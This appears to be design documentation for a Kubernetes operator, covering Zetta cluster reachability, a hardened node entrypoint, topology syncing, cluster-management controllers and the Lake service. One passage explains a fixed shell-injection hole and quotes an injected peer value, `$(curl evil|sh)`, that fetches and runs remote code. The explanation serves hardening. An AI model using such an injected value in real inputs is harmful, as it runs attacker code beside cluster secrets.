> **Follow-ups:** validate against a live Cloudflare account with Load Balancing enabled;
> auto-populate pool origins from the live wan-accessible node set
> ([#74](https://github.com/oramasearch/orama-operator/issues/74) /
> [zetta#739](https://github.com/oramasearch/zetta/issues/739)) so the main loop creates/updates
> the `CloudflareLoadBalancer` as nodes come and go.
**Zetta cluster reachability + the CF LB origin pool.** The `OramaZettaCluster` reconciler
(`internal/controller/oramazettacluster_controller.go`) classifies each slice by its **node-reachability
type** (`spec.reachability`, [operator#74](https://github.com/oramasearch/orama-operator/issues/74)):
a **`wan-accessible`** slice is a rendezvous whose routable address the operator advertises as
`.status.wanAddress` (from `spec.wanAddress` / `spec.hostNetwork` / `spec.exposePeerLoadBalancer`), while a
**`dial-out-only`** slice (the default, and any `spec.ephemeral` slice) dials OUT only and **never gets an
inbound peer LoadBalancer** — the operator ignores `spec.exposePeerLoadBalancer` on it (warns + tears down
any existing LB), fixing the earlier anti-pattern of fronting a private node with an inbound LB
([zetta#739](https://github.com/oramasearch/zetta/issues/739)). Two consumers read the wan-accessible set:
siblings copy `.status.wanAddress` into their `spec.externalPeers`, and the **Cloudflare LB origin pool**
([operator#73](https://github.com/oramasearch/orama-operator/issues/73) / the
`CloudflareLoadBalancer` CRD, [operator#76](https://github.com/oramasearch/orama-operator/pull/76))
is populated from those addresses (HTTP origin at the same host `:4800`) — the documented wiring hook, not
yet auto-populated here.

**Zetta runtime environment.** `spec.env` accepts Kubernetes `EnvVar` values and sources, appends
accepted entries after the variables the operator owns, and updates the StatefulSet pod template so a
change rolls the nodes. Operator-owned names cannot be overridden; their sorted names are exposed as
`status.ignoredEnvVars` without changing readiness. Lake copies `spec.zetta.env` to its data-plane child
and `spec.services.zettaEnv` to every managed or adopted Zetta service cluster.

**Zetta volume ownership.** Every node pod runs with uid/gid/fsGroup 10001 and
`fsGroupChangePolicy: OnRootMismatch`. A per-node RWO volume that attaches after a node move therefore
skips the recursive ownership pass when the `/data` root already has the expected group, while a new
or mismatched volume is still corrected before Zetta starts.

**Reachability + node-type FLAGS into the engine** (`mutateZettaStatefulSet`,
[zetta#803](https://github.com/oramasearch/zetta/issues/803)/[#810](https://github.com/oramasearch/zetta/issues/810)).
Classifying the slice is not enough — the operator must tell the *engine* what each node is, or the engine
seeds its CRDT `node:<id>` entry with its permanent/wan-accessible DEFAULT and `system.nodes` mislabels a
private slice while the **reachability-aware dialer stays dormant** (nodes keep advertising bound pod IPs, so
the pod-CIDR-collision undercount #803 fixes can recur). So the entrypoint now renders **`--dial-out-only`**
iff `zettaReachability` (the single source of truth shared with status + topology) is `dial-out-only`, and
**`--node-type ephemeral|permanent`** from `spec.ephemeral`. The two are **independent** axes (a private
permanent home node is `dial-out-only` + `permanent`; burst capacity is `dial-out-only` + `ephemeral`).
These are FLAGS, so they require the auth-capable image generation the operator
already mandates (post-[#799](https://github.com/oramasearch/zetta/issues/799) travels with #803/#810); an
older image would crash on the unknown flag. Verify with `SELECT reachability, node_type FROM system.nodes`.

**Zetta node entrypoint: no CR data in shell text** (`internal/controller/zetta_peers.go`,
[operator#279](https://github.com/oramasearch/orama-operator/issues/279)). The node container runs
`/bin/sh -c <zettaEntrypointScript>`, a **constant** script — the same bytes for every
`OramaZettaCluster`, with only Go constants (`/data`, `:7777`, `:4800`) formatted in. A shell is still
needed for the per-node values only known at run time (the ordinal from `POD_NAME`, `HOST_IP` under
`hostNetwork`, this node's field of `ZETTA_ADVERTISE_MAP`). Everything variable is data: the container
**args** are `zetta-entrypoint` (`$0`), the node flags, `--`, then the external peers one per argument; node-0's
seed address is the env var `ORAMA_ZETTA_SEED` (deliberately not the engine's own `ZETTA_SEED_PEER`); the
advertise map and tokens are env vars. The admin token is no longer passed as `--admin-token`: argv is
readable by every process on the node (`/proc/<pid>/cmdline`), and the engine reads `ZETTA_ADMIN_TOKEN` from
its environment when the flag is absent. `spec.env` cannot set `ORAMA_ZETTA_SEED` or the engine's own
`ZETTA_SEED_PEER`/`ZETTA_DATA_DIR`. The script grows the argv with `set -- "$@" …` and ends
with `exec zetta "$@"`, so no value is ever re-parsed, split or globbed. Before #279 the peers were pasted
into the script, so a peer such as `$(curl evil|sh)` — from `spec.externalPeers` or from any operator able to
append to the shared topology table — ran in every Zetta pod beside `ZETTA_ADMIN_TOKEN` and
`ZETTA_CLUSTER_TOKEN`. Peers are also **validated** as `host:port` (CRD pattern + controller): an invalid
`spec.externalPeers`/`spec.wanAddress` is refused (StatefulSet untouched, `PeerAddressesValid=False`, values
Go-quoted in the message), an
invalid topology address is trimmed, then dropped and reported (logged once per change), and resolved advertise addresses are checked before they are
advertised or written to the topology. For valid input the argv is what the old entrypoint produced minus
`--admin-token <token>`, and zetta still sees the token in its environment — `TestZettaEntrypointMatchesLegacyArgv` runs both scripts (under `/bin/sh` and dash, the Ubuntu
image's `/bin/sh`) against a stub `zetta` for every shape and ordinal. Changing the pod template (new
`command`, `args`, env var) **rolls every Zetta pod once** when an operator with this change first reconciles.

**Cross-cluster topology THROUGH Zetta** (`internal/controller/zetta_topology.go`,
[operator#105](https://github.com/oramasearch/orama-operator/issues/105)). Instead of an admin
hand-copying `.status.wanAddress` into siblings' `spec.externalPeers`, the operator coordinates peering
through its own datastore. Each reconcile (gated on the datastore symbiosis, best-effort like the state sync)
it **writes** this slice's wan-accessible endpoints into `orama_control.topology` (append-only, anti-flapped
like `components` — one row per node, namespaced by `operator` + global `cluster` name), Zetta **CRDT-syncs**
that table across every cluster, and it **reads** the table back (latest-wins per node by `updated_at`) to
**derive** its `--peer` set from the OTHER slices' wan endpoints. The StatefulSet's `--peer` flags
(`mutateZettaStatefulSet` → `zettaPeerSet`) are the **union** of `spec.externalPeers` (explicit override —
wins) and the derived set (deduped, excluding this slice's own nodes/addresses); topology rows are untrusted, so a
derived address that is not a valid `host:port` is dropped and named in `PeerAddressesValid`
([operator#279](https://github.com/oramasearch/orama-operator/issues/279)). Failover: a departed wan node
(scale-down / flip to `dial-out-only`) gets a **`status='gone'` marker row** and falls out of the derived set
next reconcile. Reads go through `zettaSQLQuery` (parses `.value.rows`; sends the admin bearer). **Blocked:**
removing a departed node from Zetta's own **membership CRDT** node-list is not possible over SQL (append-only)
and has no engine API yet — the `gone` marker affects only the derived `--peer` set, not the engine node-list
(see [`zetta-datastore.md`](zetta-datastore.md)).

**Observed-state projection** (`internal/controller/zetta_statesync.go`). The same enabled datastore
loop writes changed `OramaCloudV1`, `OramaZettaCluster`, and namespace-matched cluster-scoped `Lake`
status into `orama_control.components`, with a paired `component.state_changed` row in
`reconcile_events`. Both authenticated appends are best-effort and fingerprinted; a steady status writes
nothing, and a partial component/event pair retries only the missing append. Lake's full status is stored
as deterministic JSON in the component detail. See [Zetta as the operator datastore](zetta-datastore.md)
and the [Lake observed-state contract](lake/README.md#observed-state-in-zetta).

## The log is kept readable by fixing errors, never by hiding them

Steve, 2026-10-12: the log is quieted by fixing errors, not by turning off logging.

A reconcile that fails returns its error. The manager logs it and retries, and it stays in the log
until its cause is fixed. No controller downgrades, swallows or slows down an error to make the log
quieter. Two examples from the day the rule was stated:

- **Cloudflare refused the v1 sandbox's R2 bucket** with 403 from July to October. The fix was
  enabling R2 on the account, after which the bucket reconciled. A change that would have
  rechecked it quietly every 30 minutes was written, and removed.
- **A status write was refused as a conflict** on a new `KubernetesClusterProvider`. The cause was
  the write itself: a full update with a version check, from a cached read one write behind. The
  cluster-management controllers now write status as a patch of what changed, which has no version
  check, because each is the only writer of its status. A change that would have swallowed the
  conflict was written, and removed.

What remains from that work is correctness, not quiet: `settle` never returns a result together
with an error, and the KV namespace and R2 bucket controllers write a failure to status only when
it changes instead of on every retry.

## Cluster management (`kubernetescluster_controller.go`, `akscluster_controller.go`, `azure_resource_manager.go`, `clusterhelmrelease_controller.go`, `oramaoperator_controller.go`, `leaf_operator_installer.go`) — ✅ live on `orama-nonprod-cluster-01` (2026-10-12)

Managing other clusters ([`infrastructure/README.md`](infrastructure/README.md),
[#351](https://github.com/oramasearch/orama-operator/issues/351),
[#354](https://github.com/oramasearch/orama-operator/issues/354),
[#363](https://github.com/oramasearch/orama-operator/issues/363)). These controllers run in every
cluster's operator, with no flag: the operator is the same on a management cluster and a leaf, and
a cluster manages others by holding the resources. `ClusterHelmRelease` and `OramaOperator` install
pinned chart releases and the operator itself onto a managed cluster with the Helm library.
`LakeSet` and `OramaCloudV1Set` (`managedset_controller.go`,
[#391](https://github.com/oramasearch/orama-operator/issues/391)) apply `Lake` and `OramaCloudV1`
instances onto managed clusters from one template, each member in its own namespace and independent of the others.

| Controller | Reconciles | Creates |
|---|---|---|
| `KubernetesClusterReconciler` | `KubernetesCluster` (abstract) | One owned `AksCluster` when the provider has type `aks`; nothing else |
| `KubernetesClusterProviderReconciler` | `KubernetesClusterProvider` | Nothing; it checks the credentials and holds the provider while a cluster uses it |
| `AksClusterReconciler` | `AksCluster` (concrete) | In Azure: a resource group and a managed cluster. In the cluster: the owned kubeconfig Secret |

- **Only `azure_resource_manager.go` and `akscluster_controller.go` name Azure.** The abstract
  controller maps the neutral fields and the provider's settings onto an `AksCluster` with a pure
  function, so the same pair always produces the same concrete resource.
- **Create, observe and delete only.** A cluster is not changed after it exists; the `InSync`
  condition reports what differs.
- **What goes on a new cluster** is installed by `ClusterHelmRelease` and `OramaOperator`, and
  its instances by `LakeSet` and `OramaCloudV1Set`
  ([`infrastructure/README.md`](infrastructure/README.md)).
- **Live.** Three clusters have been created with these kinds (`orama-nonprod-cluster-01`,
  `orama-production-cluster-02`, `orama-production-cluster-03`), each with its platform layer,
  operator and instances installed from the managing cluster. The unit tests run against a fake
  Azure Resource Manager. Deleting a cluster, and changing one after creation, have not been
  exercised against Azure.

## `Lake` — the lake service (liquid project)

Reconciler: `internal/controller/lake_controller.go`. Full page: [`lake/README.md`](lake/README.md);
field reference: the `Lake` section of [`crd-reference.md`](crd-reference.md). This is not part of
the Orama Cloud v1 stack: it deploys `oramasearch/lake`, the hosted service of the liquid project,
and reuses this operator's CNPG, PostgresSchema and Cloudflare DNS paths.

| Creates | Name | Owned | Notes |
|---|---|---|---|
| Namespace | `spec.namespace` | no | blind Create, AlreadyExists ignored; never deleted |
| Secret | `lake-<name>-admin` | yes | admin bearer token, 64 hex, minted once |
| Secret | `lake-<name>-instance-kek` | yes | root wrapping key for lake's customer KEKs, minted once while Postgres is enabled |
| Secret | `lake-<name>-sealing-key` | yes | active and retained X25519 private keys; public recipient is published in Lake status and injected into lake |
| PersistentVolumeClaim | `spec.store.existingClaim` or `lake-<name>-store` | only the generated claim | generated once from size/class/modes and preserved across store spec changes; mounted at `/var/lib/lake/store` |
| Deployment | `lake-<name>` | yes | resource defaults or `spec.resources`; `/healthz` liveness and `/readyz` readiness; non-root uid/gid 10001; startup probe; zero-unavailable surge rollout for a ReadWriteMany store, `Recreate` for a single-replica ReadWriteOnce store unless `spec.rollout.overlapOnSharedStore` opts into a surge co-located with the running pod, and always for ReadWriteOncePod; 15 s kubelet-sleep pre-stop drain in a 45 s grace period; default or configured topology spread; store mount and `LAKE_STORE_ROOT` |
| PodDisruptionBudget | `lake-<name>` | yes | created only above one replica with `maxUnavailable: 1`; removed when scaled to one |
| Service | `lake-<name>` | yes | ClusterIP 80 → `spec.port` |
| `OramaZettaCluster` | `lake-<name>-zetta` | yes | `spec.zetta`, including `env`; data plane only, so operator-schema provisioning is off; deletion completes before the Lake finalizer is released |
| CNPG `Cluster` | `lake-<name>-controldb` | yes (unstructured) | `spec.postgres`: instances, storageSize (50Gi), storageClassName; disable tears down **with data** |
| ConfigMap + `PostgresSchema` | `lake-<name>-controldb-migrations`, `-schema` | yes | `assets/lake-schema.sql` vendored from `oramasearch/lake` `db/schema.sql`; guard = the newest migration's table (`workspace_volumes_guard`, `0069_workspace_volumes`); the Job also requires every migration the file records in `schema_migrations` (#271) |
| CNPG `ScheduledBackup` | `lake-<name>-controldb-backup` | yes (unstructured) | opt-in Barman R2/S3 backup; CNPG `Backup` resources are observed by `cnpg.io/cluster` label |
| `LakeRestoreRehearsal` scratch resources | `lake-rehearsal-<name>-<hash>` | yes | temporary Namespace containing a recovered CNPG Cluster, copied credentials, and a verification Job; all are deleted after a terminal result |
| Ingress + `CloudflareDNSRecord` | `lake-<name>`, `-dns` | yes | opt-in via `ingressEnabled` + `host` + `dnsSecretRef`, optional `tls.secretName`, and Lake streaming annotations |
| `LakeE2ETest` Job | `<test-name>-e2e` in the Lake namespace | yes, by the cluster-scoped test | starts only after Lake, Postgres, and schema readiness; the required image owns signup and liquid push/pull assertions |

Lake creates or updates its Deployment and disruption budget only after the desired schema
version is Applied. An existing Deployment stays unchanged while migration is pending or failed.
Re-vendor by copying lake `db/schema.sql` unchanged, updating the pinned commit/SHA-256 and guard,
and running the byte comparison and envtest proof in [`lake/schema.md`](lake/schema.md).
The SQL-plus-guard hash replaces obsolete migration Jobs automatically, waiting for their pods
before a replacement starts. Incremental migration files remain #126.

The `LakeSealedSecret` reconciler opens literal canonical-CBOR envelopes or requests sealed static
and dynamic values from lake, then owns an output Secret labelled `lake.orama.cloud/sealed: "true"`.
It rejects an unrelated Secret at the requested name. See [`lake/sealed-secrets.md`](lake/sealed-secrets.md).

Status mirrors the Deployment, publishes the active sealing recipient and retained-key counts,
selected store claim (claim, phase, capacity, and `StoreReady`),
the CNPG cluster (polled every 20 s, not watched), the PostgresSchema, the owned Zetta cluster
(`zettaReady` and `ZettaReady`), and enabled backup completion. Overall `Ready` requires the current
Deployment generation with all desired ready, updated, and available replicas; a Bound store;
all configured Postgres instances ready and the current schema Applied when Postgres is enabled;
and the enabled Zetta child Ready. Failed schema or Deployment states report `Degraded`, while
pending work reports `Progressing`; `conditions[Ready]` explains the blocker. CNPG polling continues
after success even with backups disabled, so later readiness loss updates the phase. Unchanged
polls write zero status updates. This contract is covered by native fake-client regressions.
Production: `Lake/prod` in namespace `lake` on AKS; R2 backup credentials must exist before its backup is enabled.

`LakeE2ETest` watches the cluster-scoped Lake independently of normal reconciliation. Target changes
and a 15-second pending requeue release the test once the Deployment, Postgres, and schema are ready.
The immutable Job then drives `http://lake-<name>.<namespace>.svc.cluster.local` from its runner image
and reports `Running`, `Succeeded`, or `Failed` without rewriting an unchanged status.
